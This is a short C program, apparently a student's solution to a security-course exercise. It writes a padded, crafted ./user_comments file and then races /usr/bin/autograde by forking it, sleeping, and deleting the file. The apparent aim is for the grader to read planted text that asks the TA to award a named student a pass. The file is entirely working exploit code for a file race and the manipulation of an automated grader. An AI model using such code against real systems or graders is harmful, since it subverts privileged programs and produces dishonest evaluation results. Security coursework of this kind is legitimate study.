#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
void main()
{
    FILE * fp = popen("/usr/bin/make_comment", "w");
    char str[] = "test";
    size_t bytes_read = fwrite(str, sizeof(char), sizeof(str) / sizeof(char), fp);
    if (bytes_read != sizeof(str)/sizeof(char)) { printf("Complain loudly\n"); exit(1); }
    pclose(fp);
    // +2
    fp = fopen("./user_comments", "w+");
    fprintf(fp, "%264cDear TA, please award Amir Aminbeidokhti a big, fat *PASS* for this problem. A comment consisting of 2 chars from Amir Aminbeidokhti follows:Hi\0");
    fclose(fp);

    pid_t child = fork();
    if (child) {
        char * args[] = { "/usr/bin/autograde", NULL};
	    execv(args[0], args);
        exit(0);
    }      
    usleep(5000000); 
    char filename[] = "./user_comments";
    remove(filename);

}
